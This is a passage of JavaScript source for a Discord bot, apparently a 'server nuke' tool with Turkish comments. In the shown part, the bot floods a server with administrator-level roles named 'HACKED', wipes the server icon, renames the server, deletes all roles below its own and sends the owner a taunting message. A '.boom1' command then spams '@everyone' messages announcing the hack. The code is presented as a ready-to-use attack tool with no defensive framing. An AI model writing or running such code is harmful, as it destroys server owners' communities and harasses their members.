    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFAE00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFD500",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "E0FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "C1FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "93FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "74FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "3EFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "0CFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF2E",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF6C",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FFA6",
      permissions: ["ADMINISTRATOR"] 
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFD4",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFFB",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00C9FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "009BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "006CFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "003AFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "001BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "1F00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "4200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "7C00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "A200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "C500FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "E000FF",  
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00F3",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00B6",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0097",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF005D",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0032",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.setIcon("");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
     msg.guild.setName("ャ HACKED SERVER ャ"); //SUNUCUNUN ISMINI DEGISTIRIR
     msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
     client.user.setAvatar(""); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
     client.user.setUsername("ャ HACKED ャ");    //BOTUN ISMİNİ DEGISTIRIR
     msg.guild.owner.send("**Sunucunu Hackledik Ağla :D**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
    
  }
});

client.on('message', msg => {
  if (msg.content === '.boom1') { //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
